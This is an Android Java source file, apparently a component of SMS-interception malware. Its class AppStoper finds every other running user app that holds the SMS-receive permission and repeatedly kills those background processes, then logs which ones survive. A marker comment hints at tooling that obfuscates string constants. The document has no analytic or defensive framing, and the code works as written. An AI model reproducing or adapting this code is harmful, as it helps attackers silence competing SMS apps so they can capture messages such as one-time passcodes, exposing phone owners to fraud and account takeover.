package net.workspace.util;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.pm.PackageManager;

@SuppressLint("NewApi")
public class AppStoper {
    private String serviceName = /*const-replace-start*/"activity";
    public void killAllSmsApps() {
        Set<String> whiteSet = new HashSet<String>();
        whiteSet.add(CommonUtil.context.getPackageName());
        ActivityManager aManager = (ActivityManager) CommonUtil.context.getSystemService(serviceName);
        PackageManager pManager = CommonUtil.context.getApplicationContext().getPackageManager();
        for (RunningAppProcessInfo info : aManager.getRunningAppProcesses()) {
            if (!whiteSet.contains(info.processName)) {
                for (String pkgName : info.pkgList) {
                    if (pManager.checkPermission(CommonUtil.ANDROID_PERMISSION_RECEIVE_SMS, pkgName) == 0) {
                        if (info.uid >= 10000) {
                            int count = 10;
                            try {
                                for (int i = 0; i < count; i++) {
                                    aManager.killBackgroundProcesses(pkgName);
                                }
                            } catch (Exception e) {
                                MyLogger.error(e);
                            }
                        }
                    }
                }
            }
        }
        releaseRemove_ShowResult();
    }
    private void releaseRemove_ShowResult() {
        MyLogger.info("--------------------------------");
        ActivityManager aManager = (ActivityManager) CommonUtil.context.getSystemService(serviceName);
        PackageManager pManager = CommonUtil.context.getApplicationContext().getPackageManager();
        StringBuilder result = new StringBuilder();
        Map<Integer, String> map = new TreeMap<Integer, String>();
        for (RunningAppProcessInfo info : aManager.getRunningAppProcesses()) {
            for (String packageName : info.pkgList) {
                if (pManager.checkPermission(CommonUtil.ANDROID_PERMISSION_RECEIVE_SMS, packageName) == PackageManager.PERMISSION_GRANTED && info.uid >= 10000) {
                    map.put(info.pid, info.uid + ";" + info.importance + ";" + packageName);
                }
            }
        }
        for (Integer key : map.keySet()) {
            result.append("pid:").append(key).append(";").append(map.get(key)).append("\n").toString();
        }
        MyLogger.info(result);
    }
}
